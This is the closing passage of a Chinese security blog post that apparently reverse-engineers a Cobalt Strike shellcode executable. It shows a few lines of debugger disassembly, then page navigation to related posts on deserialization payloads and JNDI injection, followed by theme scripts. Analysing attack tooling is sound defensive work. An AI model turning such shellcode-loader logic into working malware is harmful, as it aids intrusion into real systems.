class="number">00</span>D4436A                                         <span class="operator">|</span> <span class="number">382</span>E                        <span class="operator">|</span> cmp byte ptr ds:[esi],ch                        <span class="operator">|</span> byte ptr ds:[esi]:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D4436C                                         <span class="operator">|</span> <span class="number">3130</span>                        <span class="operator">|</span> xor dword ptr ds:[eax],esi                      <span class="operator">|</span> dword ptr ds:[eax]:unsigned <span class="type">char</span> <span class="operator">*</span>buf, esi:<span class="operator">&amp;</span>&quot;C:\\Users\\At\\Desktop\\CS_ShellCode.exe&quot;</span><br><span class="line"><span class="number">00</span>D4436E                                         <span class="operator">|</span> <span class="number">2</span>E:<span class="number">3200</span>                     <span class="operator">|</span> xor al,byte ptr cs:[eax]                        <span class="operator">|</span> byte ptr cs:[eax]:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"><span class="number">00</span>D44371                                         <span class="operator">|</span> <span class="number">3</span>ADE                        <span class="operator">|</span> cmp bl,dh                                       <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44373                                         <span class="operator">|</span> <span class="number">68</span> B1000000                 <span class="operator">|</span> push B1                                         <span class="operator">|</span></span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      
      
      
      
      
      
      
      

    </footer>
  </div>
  
    
  <nav id="article-nav" data-aos="fade-up">
    
      <div class="article-nav-link-wrap article-nav-link-left">
        
          
          
            <img data-src="/covers/8.jpg" data-sizes="auto" alt="反序列化payload缩小技术" class="lazyload">
          
        
        <a href="/2025/04/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96payload%E7%BC%A9%E5%B0%8F%E6%8A%80%E6%9C%AFoutput/"></a>
        <div class="article-nav-caption">前一篇</div>
        <h3 class="article-nav-title">
          
            反序列化payload缩小技术
          
        </h3>
      </div>
    
    
    <div class="article-nav-link-wrap article-nav-link-right">
      
        
        
          <img data-src="/covers/3.png" data-sizes="auto" alt="JNDI注入绕过高版本限制探究" class="lazyload">
        
      
      <a href="/2025/02/10/JNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/"></a>
      <div class="article-nav-caption">后一篇</div>
      <h3 class="article-nav-title">
        
          JNDI注入绕过高版本限制探究
        
      </h3>
    </div>
    
  </nav>


  
</article>






</section>
          
            <aside id="sidebar">
  <div class="sidebar-wrapper wrap-sticky">
    <div class="sidebar-wrap" data-aos="fade-up">
      
        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">文章目录</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD"><span class="toc-number">1.</span> <span class="toc-text">判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F%E5%88%86%E6%94%AF"><span class="toc-number">2.</span> <span class="toc-text">连接成功分支</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E5%88%86%E6%94%AF"><span class="toc-number">3.</span> <span class="toc-text">连接失败分支</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB"><span class="toc-number">4.</span> <span class="toc-text">汇编代码汇总</span></a></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
  <div class="sidebar-author-name">aiyakami</div>
  <div class="sidebar-description">关联B站https://space.bilibili.com/374640673</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>文章</div>
    <div class="sidebar-state-number">15</div>
  </div>
  <div class="sidebar-state-category">
    <div>分类</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>标签</div>
    <div class="sidebar-state-number">0</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">首页</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">归档</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">关于</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">友链</div>
    </div>
  
</div>
</div>
      
      
        <div class="sidebar-btn-wrapper" style="position:static">
          <div class="sidebar-toc-btn current"></div>
          <div class="sidebar-common-btn"></div>
        </div>
      
    </div>
  </div>

  
</aside>

          
        </div>
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      2020-2025
      <span class="footer-info-sep"></span>
      aiyakami
    </div>
    
      <div>
        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        24.2k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        01:49
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        <div class="sidebar-top">
          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
          <div class="arrow-up"></div>
        </div>
        <div id="mask"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">文章目录</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD"><span class="toc-number">1.</span> <span class="toc-text">判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F%E5%88%86%E6%94%AF"><span class="toc-number">2.</span> <span class="toc-text">连接成功分支</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E5%88%86%E6%94%AF"><span class="toc-number">3.</span> <span class="toc-text">连接失败分支</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB"><span class="toc-number">4.</span> <span class="toc-text">汇编代码汇总</span></a></li></ol>
      
  </div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
  <div class="sidebar-author-name">aiyakami</div>
  <div class="sidebar-description">关联B站https://space.bilibili.com/374640673</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>文章</div>
    <div class="sidebar-state-number">15</div>
  </div>
  <div class="sidebar-state-category">
    <div>分类</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>标签</div>
    <div class="sidebar-state-number">0</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">首页</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">归档</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">关于</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">友链</div>
    </div>
  
</div>
</div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>



<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>


<script type="module" data-pjax>
  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
  
  const pswp = () => {
    if (_$$('.article-entry a.article-gallery-item').length > 0) {
      new PhotoSwipeLightbox({
        gallery: '.article-entry',
        children: 'a.article-gallery-item',
        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
      }).init();
    }
    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
      new PhotoSwipeLightbox({
        gallery: '.article-gallery',
        children: 'a.article-gallery-item',
        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
      }).init();
    }
    window.lightboxStatus = 'done';
    window.removeEventListener('lightbox:ready', pswp);
  }
  if(window.lightboxStatus === 'ready') {
    pswp()
  } else {
    window.addEventListener('lightbox:ready', pswp);
  }
</script>
















  
<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>







  
<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>

  <script data-pjax>
    window.quicklink?.listen({
      timeout: 3000,
      priority: true,
      ignores: []
    });
  </script>


<div id="lazy-script">
  <div>
    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>

  <!-- hexo injector body_end start -->
<script src="/js/insert_highlight.js" data-pjax></script>
<!-- hexo injector body_end end --></body>
  </html>

